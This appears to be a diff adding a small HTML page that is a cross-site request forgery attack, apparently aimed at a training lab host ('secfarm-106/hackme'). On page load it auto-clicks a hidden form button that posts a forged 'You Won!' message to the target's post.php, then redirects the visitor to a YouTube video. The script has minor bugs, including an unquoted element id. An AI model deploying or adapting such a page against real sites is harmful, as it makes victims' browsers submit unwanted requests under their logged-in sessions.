@@ -1,0 +1,35 @@
+<html>
+<body onload="goto()">
+
+<style>
+    input[type=submit]{
+        background-color: #ccccff;
+        border:none;
+        font-size:24px;
+        padding: 32px 16px;
+        border-radius:12px;
+        font-family:"Times New Roman", Times, serif;
+    }
+</style>
+
+
+<script type="text/javascript">
+    function goto(){
+        document.getElementById(seceret).click();
+        document.submitForm.submit();
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+
+
+    }
+</script>
+
+<form action="http://secfarm-106/hackme/post.php" method="post">
+    <input type="hidden" name="title" value="You Won!">
+    <input type="hidden" name="message" value="You have been selected for a free flying dragon ride">
+    <input id="seceret" name="post_submit" type="submit" value="Click to see Something Fun">
+<!--<button type="submit" onclick="goto()">Click to see Something FUN</button>
+-->
+    </form>
+
+</body>
+</html>
